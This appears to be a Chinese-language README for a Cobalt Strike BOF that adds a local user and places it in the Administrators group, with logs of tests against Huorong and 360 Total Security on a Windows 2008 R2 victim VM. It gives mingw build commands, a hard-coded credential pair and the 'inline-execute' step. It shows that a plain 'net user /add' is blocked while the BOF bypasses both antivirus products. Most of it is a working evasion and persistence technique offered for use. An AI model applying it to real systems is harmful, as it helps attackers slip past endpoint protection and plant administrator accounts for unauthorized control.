### 0x00 基本原理
利用CS4.1中新出的BOF功能提供的API实现添加用户，并将用户添加到管理员组

### 0x01 测试火绒过程记录
受害虚拟机：Windows 2008 R2安装火绒  
kali下执行如下命令安装需要的库
```
sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode
```
安装完之后，执行如下命令分别生成32位和64位的对象文件
```
x86_64-w64-mingw32-gcc -c bof-net-user.c -o bof-net-user-x64.o
i686-w64-mingw32-gcc -c bof-net-user.c -o bof-net-user-x86.o
编译后的对象文件包含用户名密码：test123/Test@#123
这里要注意：32位进程载入32位对象，64位进程载入64位对象
```
CS上线后，直接执行
```
shell net user test test /add
```
会被拦截，如下图  
![image](./pic/0.png)
通过内联执行的方式执行对象文件bof-net-user-x86.o
```
inline-execute /home/kali/Desktop/bof-net-user-x86.o
```
等待一会，反馈成功添加用户，如下图  
![image](./pic/1.png)  
回到受害机上查看，成功添加用户，如下图  
![image](./pic/2.png)  

### 0x01 测试360安全卫士过程记录
受害虚拟机：Windows 2008 R2安装360安全卫士  
同样CS上线后，直接执行
```
shell net user test test /add
```
会被拦截，如下图  
![image](./pic/3.png)  
通过内联执行的方式执行对象文件bof-net-user-x86.o
```
inline-execute /home/kali/Desktop/bof-net-user-x86.o
```
等待一会，反馈成功添加用户，如下图  
![image](./pic/4.png)  
回到受害机上查看，成功添加用户，如下图  
![image](./pic/5.png)  
